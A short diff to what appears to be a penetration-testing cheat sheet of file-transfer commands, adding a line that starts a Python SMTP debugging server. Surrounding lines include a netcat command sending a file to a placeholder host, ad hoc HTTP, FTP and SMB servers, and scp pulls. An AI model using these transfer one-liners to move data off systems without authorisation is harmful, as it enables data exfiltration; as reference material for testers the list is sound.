@@ -109,6 +109,7 @@ nc -w 3 x.x.x.x 1234 &lt; out.file #sending
 python2 -m SimpleHTTPServer 80 #web server
 python3 -m https.server 80
 python -m pyftpdlib -p 21 --write #ftp server
+python -m smtpd -n -c DebuggingServer :25 #smtp server
 sudo smbserver.py share . -smb2support #smb server
 #ssh
 scp -r user@x.x.x.x:{file.txt,file.exe} .
